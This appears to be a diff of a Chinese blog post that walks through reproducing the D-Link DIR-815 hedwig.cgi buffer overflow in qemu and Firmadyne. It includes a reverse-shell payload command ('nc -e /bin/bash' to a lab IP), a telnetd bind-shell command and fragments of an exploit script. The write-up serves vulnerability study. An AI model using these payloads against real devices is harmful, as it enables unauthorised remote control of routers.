-<h2 id="利用qemu-system-mipsel调试"><a href="#利用qemu-system-mipsel调试" class="headerlink" title="利用qemu-system-mipsel调试"></a>利用qemu-system-mipsel调试</h2><p>我们这里主要是为了在qemu虚拟机中重现http服务。通过查看文件系统中的<code>/bin、/sbin、/usr/bin、/usr/sbin</code>可以知道<code>/sbin/httpd</code>应该是用于监听web端口的http服务，同时查看<code>/htdocs/web</code>文件夹下的cgi文件和php文件，可以了解到接受到的数据通过php+cgi来处理并返回客户端。</p>
-<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p><code>find ./ -name '*http*'</code>找到web配置文件httpcfg.php。</p>
+<h1 id="05-qemu系统模式"><a href="#05-qemu系统模式" class="headerlink" title="05-qemu系统模式"></a>05-qemu系统模式</h1><p>我们这里主要是为了在qemu虚拟机中重现http服务。通过查看文件系统中的<code>/bin、/sbin、/usr/bin、/usr/sbin</code>可以知道<code>/sbin/httpd</code>应该是用于监听web端口的http服务，同时查看<code>/htdocs/web</code>文件夹下的cgi文件和php文件，可以了解到接受到的数据通过php+cgi来处理并返回客户端。</p>
+<h2 id="5-1-环境配置"><a href="#5-1-环境配置" class="headerlink" title="5.1-环境配置"></a>5.1-环境配置</h2><p><code>find ./ -name '*http*'</code>找到web配置文件httpcfg.php。</p>
 <pre class=" language-sh"><code class="language-sh">./etc/services/HTTP/httpcfg.php
 ./etc/services/HTTP/httpsvcs.php
 ./usr/sbin/httpc
@@ -577,10 +594,10 @@ Server
         <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span></code></pre>
-<p>接下来利用qemu系统模式仿真路由器的运行环境，具体的配置过程在之前的<a href="https://pup2y.github.io/2020/03/30/lu-you-qi-lou-dong-wa-jue-huan-jing-da-jian/">路由器漏洞挖掘环境搭建</a>。</p>
-<p>利用下面命令启动，接下来的实验是一次性实验，因为会覆盖qemu虚拟机原本文件系统中的/etc等文件夹从而损坏原有配置，所以无法第二次启动。同时需要注意选择的内核应该是vmlinux-3.2.0-4-4kc-malta，版本太低与我所有gdbserver不匹配。</p>
+<p>接下来利用qemu系统模式仿真路由器的运行环境，具体的配置过程在文章<a href="https://pup2y.github.io/2020/03/30/lu-you-qi-lou-dong-wa-jue-huan-jing-da-jian/">路由器漏洞挖掘环境搭建</a>的qemu网络配置中有提到。</p>
+<p>利用下面命令启动，接下来的实验是一次性实验，因为会覆盖qemu虚拟机原本文件系统中的/etc等文件夹从而损坏原有配置，所以无法第二次启动。</p>
 <pre class=" language-sh"><code class="language-sh">sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap -nographic</code></pre>
-<p>测试下能ping通的情况下，将文件系统利用scp命令拷贝到mipsel虚拟机中。</p>
+<p>测试能ping通的情况下，将文件系统利用scp命令拷贝到mipsel虚拟机中。</p>
 <pre class=" language-sh"><code class="language-sh">sudo scp -r squashfs-root root@192.168.79.143:/root/</code></pre>
 <p>之后编写copy.sh脚本配置启动http服务需要的环境包括动态链接库，以及conf配置文件中提到的<code>/usr/sbin/phpcgi</code>，<code>/usr/sbin/hnap</code>。</p>
 <p>copy.sh，需要进入squashfs-root目录使用，脚本最后启动了http服务。</p>
@@ -634,7 +651,7 @@ Sun May 24 00:59:43 2020 [1109] script timeout to 192.168.79.145[52472]
 Sun May 24 01:00:46 2020 [1109] process_headers: method[POST], nheaders=[4], URL[/hedwig.cgi]
 Sun May 24 01:00:46 2020 [1109] child process 1112 exited with status 255</code></pre>
 <p>到这里可以看到我们需要的web服务器以及启动了。</p>
-<h3 id="单一程序调试"><a href="#单一程序调试" class="headerlink" title="单一程序调试"></a>单一程序调试</h3><p>接下来尝试调试<code>/htdocs/web/hedwig.cgi</code>文件</p>
+<h2 id="5-2-gdbbserver调试"><a href="#5-2-gdbbserver调试" class="headerlink" title="5.2-gdbbserver调试"></a>5.2-gdbbserver调试</h2><p>接下来尝试调试<code>/htdocs/web/hedwig.cgi</code>文件</p>
 <pre class=" language-sh"><code class="language-sh">root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi 
 HTTP/1.1 200 OK
 Content-Type: text/xml
@@ -715,7 +732,7 @@ root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi & cat /proc/1056/maps
 
 [11]+  Stopped                 /htdocs/web/hedwig.cgi
 root@debian-mipsel:~/squashfs-root#</code></pre>
-<h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h3><p>上面既然用了两种方法：system和sleep(1)，那么下面也使用这两种。</p>
+<h2 id="5-3-编写exp"><a href="#5-3-编写exp" class="headerlink" title="5.3-编写exp"></a>5.3-编写exp</h2><p>上面既然用了两种方法：system和sleep(1)，那么下面也使用这两种。</p>
 <ol>
 <li><p>system方法：将上面的exp的libc基地址和偏移改掉然后cmd换成<code>nc -e /bin/bash 192.168.79.145 9999</code></p>
 <pre class=" language-sh"><code class="language-sh">#!/usr/bin/python2
@@ -924,7 +941,7 @@ context<span class="token punctuation">.</span>arch <span class="token operator"
     <span class="token keyword">print</span> r<span class="token punctuation">.</span>text</code></pre>
 <p>测试结果：获取shell</p>
 <p><img src="http_getshell_sleep.png" alt=""></p>
-<h2 id="利用Firmadyne仿真进行测试"><a href="#利用Firmadyne仿真进行测试" class="headerlink" title="利用Firmadyne仿真进行测试"></a>利用Firmadyne仿真进行测试</h2><p>Firmadyne的安装过程这里就不再继续介绍，这里是用它来测试，能够启动起来。并且访问firmadyne给其分配的默认web接口192.168.0.1。</p>
+<h2 id="Firmadyne仿真及实体测试"><a href="#Firmadyne仿真及实体测试" class="headerlink" title="Firmadyne仿真及实体测试"></a>Firmadyne仿真及实体测试</h2><p>Firmadyne的安装过程这里就不再继续介绍，这里是用它来测试，能够启动起来。并且访问firmadyne给其分配的默认web接口192.168.0.1。</p>
 <p><img src="firmadyne.png" alt=""></p>
 <p>nmap扫描查看开放的端口，目前3各端口分别对应dns53,http80,upnp49152。</p>
 <pre class=" language-sh"><code class="language-sh">Starting Nmap 7.01 ( https://nmap.org ) at 2020-05-24 16:21 CST
@@ -998,9 +1015,9 @@ context<span class="token punctuation">.</span>arch <span class="token operator"
     <span class="token keyword">print</span> r<span class="token punctuation">.</span>text</code></pre>
 <p>测试结果显示能够执行<code>telnetd -p 222 -l /bin/sh</code>。telnet 上去对应的窗口直接反弹shell。</p>
 <p><img src="telnetdp222.png" alt=""></p>
-<h1 id="在实体机上测试"><a href="#在实体机上测试" class="headerlink" title="在实体机上测试"></a>在实体机上测试</h1><p> 在实体机上刷上1.01的版本，用system方法的exp同样能得到获取shell。</p>
+<p>在实体机上刷上1.01的版本，用system方法的exp同样能得到获取shell。</p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>到这里，终于分析完了，整个过程其实遇到了不少的坑，从最开始死活到不了第二个sprintf，到后面的qemu系统模式如何修改http配置文件都起不来http服务，还有shellcode的修改等等问题都可能卡好久，最后解决的时候才知道并不是太难的问题。。。还是太菜了！我这都是第二次分析了，才能有个大概的了解，想想一年间的自己到底学到了什么。。。整个流程完全自己复现一遍并且能够很清楚的讲出来，其实个人感觉收获还是很多的，比如路由器缓冲区溢出漏洞的分析调试详细流程，gdb、IDA、Ghidra等工具联调使用，以及该libc的万能gadget等等。</p>
-<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://www.anquanke.com/post/id/179510#h3-8" target="_blank" rel="noopener">路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析</a></p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.anquanke.com/post/id/179510#h3-8" target="_blank" rel="noopener">路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析</a></p>
 <p><a href="https://www.anquanke.com/post/id/187443#h2-9" target="_blank" rel="noopener">IOT设备漏洞挖掘从入门到入门（二）- DLink Dir 815漏洞分析及三种方式模拟复现</a></p>
 <p><a href="https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/#Run-POC-amp-amp-反弹get-shell" target="_blank" rel="noopener">Building MIPS Environment for Router &amp;&amp; PWN</a> </p>
 <p><a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a> </p>
@@ -1062,7 +1079,7 @@ context<span class="token punctuation">.</span>arch <span class="token operator"
     </div>
     
         <div class='side'>
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞介绍"><span class="toc-number">2.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#固件获取及漏洞定位"><span class="toc-number">3.</span> <span class="toc-text">固件获取及漏洞定位</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#固件解压"><span class="toc-number">3.1.</span> <span class="toc-text">固件解压</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞定位"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞定位</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞重新定位"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞重新定位</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析与利用"><span class="toc-number">4.</span> <span class="toc-text">漏洞分析与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#动态调试确定偏移"><span class="toc-number">4.3.</span> <span class="toc-text">动态调试确定偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#重新确定偏移"><span class="toc-number">4.4.</span> <span class="toc-text">重新确定偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#构造ROP链"><span class="toc-number">4.5.</span> <span class="toc-text">构造ROP链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#通过system函数getshell"><span class="toc-number">4.5.1.</span> <span class="toc-text">通过system函数getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#定位system函数地址"><span class="toc-number">4.5.1.1.</span> <span class="toc-text">定位system函数地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#绕过0构造rop链"><span class="toc-number">4.5.1.2.</span> <span class="toc-text">绕过0构造rop链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#测试结果"><span class="toc-number">4.5.1.3.</span> <span class="toc-text">测试结果</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#调用sleep-1-函数"><span class="toc-number">4.5.2.</span> <span class="toc-text">调用sleep(1)函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP-Gadget使用"><span class="toc-number">4.5.2.1.</span> <span class="toc-text">ROP Gadget使用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ROP-Gadget-1"><span class="toc-number">4.5.2.1.1.</span> <span class="toc-text">ROP Gadget 1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ROP-Gadget-2"><span class="toc-number">4.5.2.1.2.</span> <span class="toc-text">ROP Gadget 2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ROP-Gadget-3"><span class="toc-number">4.5.2.1.3.</span> <span class="toc-text">ROP Gadget 3</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ROP-Gadget-4"><span class="toc-number">4.5.2.1.4.</span> <span class="toc-text">ROP Gadget 4</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#构造exp"><span class="toc-number">4.5.2.1.5.</span> <span class="toc-text">构造exp</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用qemu-system-mipsel调试"><span class="toc-number">4.6.</span> <span class="toc-text">利用qemu-system-mipsel调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境配置"><span class="toc-number">4.6.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#单一程序调试"><span class="toc-number">4.6.2.</span> <span class="toc-text">单一程序调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编写exp"><span class="toc-number">4.6.3.</span> <span class="toc-text">编写exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用HTTP报文获取shell"><span class="toc-number">4.7.</span> <span class="toc-text">利用HTTP报文获取shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用Firmadyne仿真进行测试"><span class="toc-number">4.8.</span> <span class="toc-text">利用Firmadyne仿真进行测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#在实体机上测试"><span class="toc-number">5.</span> <span class="toc-text">在实体机上测试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考文献"><span class="toc-number">7.</span> <span class="toc-text">参考文献</span></a></li></ol>	
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#00-前言"><span class="toc-number">1.</span> <span class="toc-text">00-前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#01-漏洞介绍"><span class="toc-number">2.</span> <span class="toc-text">01-漏洞介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#02-调试环境"><span class="toc-number">3.</span> <span class="toc-text">02-调试环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#03-漏洞定位"><span class="toc-number">4.</span> <span class="toc-text">03-漏洞定位</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1漏洞重新定位"><span class="toc-number">4.1.</span> <span class="toc-text">3-1漏洞重新定位</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#04-漏洞分析与利用"><span class="toc-number">5.</span> <span class="toc-text">04-漏洞分析与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-漏洞分析"><span class="toc-number">5.1.</span> <span class="toc-text">4.1-漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-漏洞利用"><span class="toc-number">5.2.</span> <span class="toc-text">4.2-漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-1-劫持PC，确定偏移"><span class="toc-number">5.2.1.</span> <span class="toc-text">4.2.1-劫持PC，确定偏移</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-1-1-重新确定偏移"><span class="toc-number">5.2.1.1.</span> <span class="toc-text">4.2.1.1-重新确定偏移</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-2-选择攻击路径构造ROP链"><span class="toc-number">5.2.2.</span> <span class="toc-text">4.2.2-选择攻击路径构造ROP链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-2-1-通过system函数getshell"><span class="toc-number">5.2.2.1.</span> <span class="toc-text">4.2.2.1-通过system函数getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-2-2-调用sleep-1-函数"><span class="toc-number">5.2.2.2.</span> <span class="toc-text">4.2.2.2-调用sleep(1)函数</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#05-qemu系统模式"><span class="toc-number">6.</span> <span class="toc-text">05-qemu系统模式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-环境配置"><span class="toc-number">6.1.</span> <span class="toc-text">5.1-环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-gdbbserver调试"><span class="toc-number">6.2.</span> <span class="toc-text">5.2-gdbbserver调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3-编写exp"><span class="toc-number">6.3.</span> <span class="toc-text">5.3-编写exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用HTTP报文获取shell"><span class="toc-number">6.4.</span> <span class="toc-text">利用HTTP报文获取shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Firmadyne仿真及实体测试"><span class="toc-number">6.5.</span> <span class="toc-text">Firmadyne仿真及实体测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">8.</span> <span class="toc-text">参考资料</span></a></li></ol>	
         </div>
     
 </div>
